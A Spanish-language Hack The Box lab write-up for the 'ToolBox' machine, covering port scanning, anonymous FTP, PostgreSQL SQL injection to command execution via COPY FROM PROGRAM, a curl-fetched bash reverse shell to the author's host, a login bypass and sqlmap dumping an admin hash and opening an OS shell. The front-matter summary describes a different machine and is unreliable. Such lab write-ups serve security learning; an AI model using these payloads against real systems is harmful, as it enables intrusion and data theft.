---
layout: single
title: Hack The Box - ToolBox 
excerpt: "Rabbit Store es una máquina media de Try Hack Me donde se explota una api para obtener acceso privilegiado a un sistema donde pueden cargarse archivos, apartir de aqui se explota un SSRF para obtener un endpoint de la api en especifico, posteriormente se explota un SSTI que permite la ejecución remota de comandos, para la escalación de privilegios se comunica con rabbitqm para obtener la ocntraseña del root"
date: 2025-10-09
classes: wide
header:
  teaser: /assets/images/htb-writeup-ToolBox/toolbox.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp 
categories:
  - Hack THe Box
  - Web Pentesting
  - Docker
tags:  
  - PostgreSQL Injection
  - sqlmap
  - docker pivoting 
  - boot2docker (Docker ToolBox)
  

---
<style>
  body {
    margin: 0;
    padding: 0;
    background-color: #0b101b;
    font-family: Arial, sans-serif;
    color: white;
  }

  /* Centramos únicamente los elementos visuales */
  .glitch,
  .title,
  .date,
  .info {
    text-align: center;
    margin-left: auto;
    margin-right: auto;
  }

  .glitch {
    position: relative;
    width: 90%;
    max-width: 400px;
    height: 300px;
        background-image: url("/assets/images/htb-writeup-ToolBox/toolbox.png");
        background-size: cover;
        background-position: center;
        margin: 2rem auto 1rem auto;
        overflow: hidden;
      }

      .glitch:before {
        content: '';
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-image: url("/assets/images/htb-writeup-ToolBox/toolbox.png");
        background-size: cover;
        background-position: center;
        opacity: 0.5;
        mix-blend-mode: hard-light;
        animation: glitch2 10s linear infinite;
      }

      .glitch:hover:before {
        animation: glitch1 1s linear infinite;
      }

      @keyframes glitch1 {
        0% { background-position: 0 0; filter: hue-rotate(0deg); }
        10% { background-position: 5px 0; }
        20% { background-position: -5px 0; }
        30% { background-position: 15px 0; }
        40% { background-position: -5px 0; }
        50% { background-position: -25px 0; }
        60% { background-position: -50px 0; }
        70% { background-position: 0 -20px; }
        80% { background-position: -60px -20px; }
        81% { background-position: 0 0; }
        100% { background-position: 0 0; filter: hue-rotate(360deg); }
      }

      @keyframes glitch2 {
        0% { background-position: 0 0; filter: hue-rotate(0deg); }
        10% { background-position: 15px 0; }
        15% { background-position: -15px 0; }
        20% { filter: hue-rotate(360deg); }
        25% { background-position: 0 0; filter: hue-rotate(0deg); }
        100% { background-position: 0 0; filter: hue-rotate(0deg); }
      }

      .title {
        font-size: 1.5rem;
        font-weight: bold;
        margin-bottom: 0.5rem;
      }

      .date {
        font-size: 1rem;
        color: #ccc;
        margin-bottom: 1rem;
      }

      .info {
        display: flex;
        justify-content: center;
        gap: 2rem;
        flex-wrap: wrap;
        margin-top: 1rem;
        font-size: 0.9rem;
      }

      .info div {
        text-align: center;
      }

      .info .label {
        color: #999;
        font-size: 0.8rem;
      }

      .icon {
        font-size: 2rem;
        color: #0f0;
        margin: 0.5rem 0;
      }

      /* Responsive */
      @media (max-width: 575.5px) {
        .glitch {
          height: 200px;
        }
        .title {
          font-size: 1.3rem;
        }
      }
    </style>

    <body>
        <div class="glitch">  
        </div>
    </body>

    <br>

`ToolBox` es una máquina _Easy_ de Hack The Box. Se explota una inyección SQL contra PostgreSQL para obtener una shell. Aunque la máquina parece Windows, ejecuta contenedores Linux, por lo que la explotación desde la inyección requiere payloads de Linux. Para escalar privilegios se abusa de Boot2Docker (Docker Toolbox) para pivotar a otro contenedor del mismo segmento; desde allí hay un montaje con estructura Windows que contiene una clave SSH que permite conectarse como **Administrador**.  

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

```bash
Nmap scan report for 10.10.10.236
Host is up, received user-set (0.35s latency).
Scanned at 2025-10-08 11:07:16 CST for 28s

PORT      STATE SERVICE       REASON          VERSION
21/tcp    open  ftp           syn-ack ttl 127 FileZilla ftpd 0.9.60 beta
22/tcp    open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.38 ((Debian))
445/tcp   open  microsoft-ds? syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

tras realizar otro escaneo **-sV** con Nmap, se observa que el puerto 443 está abierto y en el _Common Name_ del certificado aparece un subdominio: _admin.megalogistic.com_

```bash
443/tcp   open  ssl/http      syn-ack ttl 127 Apache httpd 2.4.38 ((Debian))
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/organizationalUnitName=Web/emailAddress=admin@megalogistic.com
| Issuer: commonName=admin.megalogistic.com/organizationName=MegaLogistic Ltd/stateOrProvinceName=Some-State/countryName=GR/organizationalUnitName=Web/emailAddress=admin@megalogistic.com
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-02-18T17:45:56
| Not valid after:  2021-02-17T17:45:56
| MD5:   091b:4c45:c743:a4e0:bdb2:d2aa:d860:f3d0
| SHA-1: 8255:9ba0:3fc7:79e4:f05d:8232:5bdf:a957:8b2b:e3eb
| -----BEGIN CERTIFICATE-----
```

esto se puede comprobar con _OpenSSL_, conectándose como cliente a la máquina para inspeccionar el certificado manualmente

```bash
┌──(root㉿kali)-[/opt/srp3rr1n.github.io/_posts]
└─# openssl s_client -connect 10.10.10.236:443
Connecting to 10.10.10.236
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 C=GR, ST=Some-State, O=MegaLogistic Ltd, OU=Web, CN=admin.megalogistic.com, emailAddress=admin@megalogistic.com
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=GR, ST=Some-State, O=MegaLogistic Ltd, OU=Web, CN=admin.megalogistic.com, emailAddress=admin@megalogistic.com
verify error:num=10:certificate has expired
notAfter=Feb 17 17:45:56 2021 GMT
verify return:1
depth=0 C=GR, ST=Some-State, O=MegaLogistic Ltd, OU=Web, CN=admin.megalogistic.com, emailAddress=admin@megalogistic.com
notAfter=Feb 17 17:45:56 2021 GMT
verify return:1
---
Certificate chain
 0 s:C=GR, ST=Some-State, O=MegaLogistic Ltd, OU=Web, CN=admin.megalogistic.com, emailAddress=admin@megalogistic.com
   i:C=GR, ST=Some-State, O=MegaLogistic Ltd, OU=Web, CN=admin.megalogistic.com, emailAddress=admin@megalogistic.com
   a:PKEY: RSA, 2048 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Feb 18 17:45:56 2020 GMT; NotAfter: Feb 17 17:45:56 2021 GMT
---
Server certificate
...SNIP...
```

Así que agregare a mi archivo /etc/hosts este dominio y subdominio

```bash
┌──(root㉿kali)-[/opt/srp3rr1n.github.io/_posts]
└─# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.236    admin.megalogistic.com megalogistic.com
```
## FTP

Es posible iniciar sesión en ftp con el usuario `Anonymous` sin usar contraseña

```bash
┌──(root㉿kali)-[/]
└─# ftp 10.10.10.236
Connected to 10.10.10.236.
220-FileZilla Server 0.9.60 beta
220-written by Tim Kosse (tim.kosse@filezilla-project.org)
220 Please visit https://filezilla-project.org/
Name (10.10.10.236:kali): Anonymous
331 Password required for anonymous
Password: 
230 Logged on
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||53319|)
150 Opening data channel for directory listing of "/"
-r-xr-xr-x 1 ftp ftp      242520560 Feb 18  2020 docker-toolbox.exe
226 Successfully transferred "/"
```
dentro se encuentra un archivo `.exe` denominado _docker-toolbox_, el cual se utilizaba para integrar la funcionalidad de Docker en sistemas Windows y macOS antiguos que no cumplían con los requisitos de Docker Desktop. Esto sugiere que la máquina podría estar ejecutando un contenedor.

## Enumeración WEB

al revisar la página web del subdominio, se mostró un formulario de inicio de sesión.

![](/assets/images/htb-writeup-ToolBox/sig.png)

## PostgreSQL Injection método 1 

al ingresar una comilla se obtiene un error de sintaxis `pg_query`, lo cual indica que el motor de base de datos es PostgreSQL.

![](/assets/images/htb-writeup-ToolBox/sqli.png)

para explotar la inyección utilicé la referencia [PostgreSQL injection](https://book.hacktricks.wiki/en/pentesting-web/sql-injection/postgresql-injection/index.html?highlight=postgresql%20injection#postgresql-injection). Primero probé un payload de tipo _time-based_ que hace que la aplicación tarde 10 segundos en responder; al observar ese retraso, se confirma que es vulnerable a inyección SQLL

```bash
username='; select pg_sleep(10);-- - 
```
![](/assets/images/htb-writeup-ToolBox/time.png)

de acuerdo a  la PoC para lograr un RCE primero cree una tabla:

```bash
CREATE TABLE cmd_exec(cmd_output text);-- -
```
Para corroborar que la tabla se creó exitosamente, basta con volver a enviar la consulta; el error indicará que la tabla ya existe 

![](/assets/images/htb-writeup-ToolBox/error.png)

de acuerdo con la PoC, para ejecutar un comando debe usarse el siguiente payload

```bash
username=';COPY+cmd_exec+FROM+PROGRAM+'id';--+-
```

En mi caso decidí montar un recurso compartido con Impacket para transferir y ejecutar `netcat`; sin embargo, no se estableció la conexión

```bash
username=';COPY+cmd_exec+FROM+PROGRAM+'\\10.10.16.2\smbFolder\nc.exe+-e+cmd+10.10.16.2+443';--+-
```

```bash
┌──(root㉿kali)-[/opt]
└─# impacket-smbserver smbFolder $(pwd) -smb2support     
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
```
Intenté con un servidor temporal en Python y, en este caso, funcionó

```bash
username=';COPY+cmd_exec+FROM+PROGRAM+'curl+10.10.16.2/test';--+-
```
![](/assets/images/htb-writeup-ToolBox/curl.png)

```bash
┌──(root㉿kali)-[/opt]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.236 - - [08/Oct/2025 13:35:20] code 404, message File not found
10.10.10.236 - - [08/Oct/2025 13:35:20] "GET /test HTTP/1.1" 404 -
```

con esto se valida que hay ejecución remota de comandos. Como no se sincronizó con mi recurso compartido anterior y, dado el ejecutable hallado en el servicio FTP, podría tratarse de un contenedor Linux; por eso creé un archivo llamado `r` con una reverse shell y lo invoqué mediante `curl`

```bash
┌──(root㉿kali)-[/opt]
└─# cat r                                            
#!/bin/bash

bash -i >& /dev/tcp/10.21.25.64/443 0>&1
```
![](/assets/images/htb-writeup-ToolBox/cbash.png)

```bash
┌──(root㉿kali)-[/opt]
└─# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.236 - - [08/Oct/2025 13:50:10] "GET /r HTTP/1.1" 200 -

┌──(root㉿kali)-[/home/kali]
└─# nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from admin.megalogistic.com [10.10.10.236] 49848
bash: cannot set terminal process group (7636): Inappropriate ioctl for device
bash: no job control in this shell
postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$ 
```
## PostgreSQL Injection método 2

Es posible hacer un bypass en el login utilizando el siguiente payload: `' or 1=1-- -`

![](/assets/images/htb-writeup-ToolBox/or.png)

![](/assets/images/htb-writeup-ToolBox/panel.png)

guardando la petición y ejecutando _sqlmap_, encontré la inyección

```bash
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 39 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
    Payload: username=user' AND (SELECT (CASE WHEN (2272=2272) THEN NULL ELSE CAST((CHR(114)||CHR(118)||CHR(108)||CHR(85)) AS NUMERIC) END)) IS NULL-- TOWJ&password=password

    Type: error-based
    Title: PostgreSQL AND error-based - WHERE or HAVING clause
    Payload: username=user' AND 3874=CAST((CHR(113)||CHR(106)||CHR(120)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (3874=3874) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(120)||CHR(98)||CHR(112)||CHR(113)) AS NUMERIC)-- brMa&password=password

    Type: stacked queries
    Title: PostgreSQL stacked queries (heavy query)
    Payload: username=user';SELECT COUNT(*) FROM GENERATE_SERIES(1,5000000)-- kaED&password=password

    Type: time-based blind
    Title: PostgreSQL > 8.1 AND time-based blind
    Payload: username=user' AND 3361=(SELECT 3361 FROM PG_SLEEP(5))-- IJru&password=password
---
[14:39:02] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[14:39:10] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/admin.megalogistic.com'
[14:39:10] [WARNING] your sqlmap version is outdated
```

posteriormente, validé cuál era la base de datos en uso: resultó ser `public`

```bash
[15:28:45] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[15:28:45] [INFO] fetching current database
[15:28:46] [INFO] retrieved: 'public'
[15:28:46] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
current database (equivalent to schema on PostgreSQL): 'public'
[15:28:46] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/admin.megalogistic.com'
[15:28:46] [WARNING] your sqlmap version is outdated
```

después, enumeré las tablas de la BD `public`; en la lista aparece la tabla `cmd_exec`, creada durante la explotación anterior.

```bash
web server operating system: Linux Debian 10 (buster)
web application technology: PHP 7.3.14, Apache 2.4.38
back-end DBMS: PostgreSQL
[15:29:06] [INFO] fetching tables for database: 'public'
[15:29:09] [INFO] retrieved: 'users'
[15:29:10] [INFO] retrieved: 'cmd_exec'
Database: public
[2 tables]
+----------+
| cmd_exec |
| users    |
+----------+
```

al dumpear esta tabla se puede identificar el hash de la contraseña del administrador 

```bash
Database: public
Table: users
[1 entry]
+----------------------------------+----------+
| password                         | username |
+----------------------------------+----------+
| 4a100a85cb5ca3616dcf137918550815 | admin    |
+----------------------------------+----------+
```

posteriormente validé si el usuario tenía privilegios de DBA, y resultó que sí

```bash
[15:37:55] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[15:37:55] [INFO] testing if current user is DBA
current user is DBA: True
```

finalmente obtuve una shell con el parámetro `--os-shell` de sqlmap

```bash
[15:38:50] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38, PHP 7.3.14
back-end DBMS: PostgreSQL
[15:38:50] [INFO] fingerprinting the back-end DBMS operating system
[15:38:55] [INFO] the back-end DBMS operating system is Linux
[15:38:58] [INFO] testing if current user is DBA
[15:39:01] [INFO] retrieved: '1'
[15:39:02] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[15:39:02] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
[15:39:16] [INFO] retrieved: 'postgres'
command standard output: 'postgres'
os-shell> 
```














